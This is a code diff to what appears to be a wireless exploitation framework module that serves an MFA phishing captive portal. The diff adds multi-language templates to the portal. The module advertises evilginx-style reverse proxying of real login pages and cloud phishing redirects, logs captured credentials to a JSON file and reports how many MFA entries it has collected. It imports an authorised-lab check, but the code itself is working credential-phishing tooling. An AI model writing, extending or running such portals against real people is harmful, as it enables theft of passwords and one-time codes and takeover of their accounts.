@@ -12,7 +12,7 @@ Modes:
   - external_proxy  Reverse proxy to real login (evilginx-style)
   - cloud_redirect  Redirect to cloud-hosted phishing page (Phishkin3-style)
 
-Version: 1.0.0
+Version: 2.0.0
 """
 
 from __future__ import annotations
@@ -30,6 +30,10 @@ from urllib.parse import parse_qs
 from wirelessxpl.core.exploit import *
 
 from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab
+from wirelessxpl.modules.generic.wifi_lab._i18n_service import (
+    I18nPortalHandler,
+    SUPPORTED_LOCALES,
+)
 
 logger = logging.getLogger(__name__)
 
@@ -193,20 +197,26 @@ class Exploit(Exploit):
         if not tpl_dir:
             return
 
-        MFACredentialHandler.template_dir = str(tpl_dir)
-        MFACredentialHandler.credentials_log = Path(".log") / "mfa_phishing_creds.json"
+        I18nPortalHandler.template_dir = tpl_dir
+        I18nPortalHandler.cred_log = Path(".log") / "mfa_phishing_creds.json"
+        I18nPortalHandler.portal_host = "10.0.0.1"
+        I18nPortalHandler.connectivity_detect = self.connectivity_detection
+        I18nPortalHandler.extra_vars = {}
 
-        server = http.server.HTTPServer(("0.0.0.0", self.portal_port), MFACredentialHandler)
-        print_status("MFA portal on port {} — template: {}".format(self.portal_port, self.template))
-        print_info("Connectivity detection: {}".format("ON" if self.connectivity_detection else "OFF"))
-        print_info("Credentials log: {}".format(MFACredentialHandler.credentials_log))
+        server = http.server.HTTPServer(("0.0.0.0", self.portal_port), I18nPortalHandler)
+        print_status("MFA portal (i18n) on port {} — template: {}".format(
+            self.portal_port, self.template))
+        print_info("Auto-detect locales: {}".format(", ".join(SUPPORTED_LOCALES)))
+        print_info("Connectivity detection: {}".format(
+            "ON" if self.connectivity_detection else "OFF"))
+        print_info("Credentials log: {}".format(I18nPortalHandler.cred_log))
 
         try:
             server.serve_forever()
         except KeyboardInterrupt:
             server.shutdown()
 
-        cred_log = MFACredentialHandler.credentials_log
+        cred_log = I18nPortalHandler.cred_log
         if cred_log.exists():
             count = sum(1 for _ in open(cred_log, encoding="utf-8"))
             print_success("Captured {} MFA credential entries.".format(count))
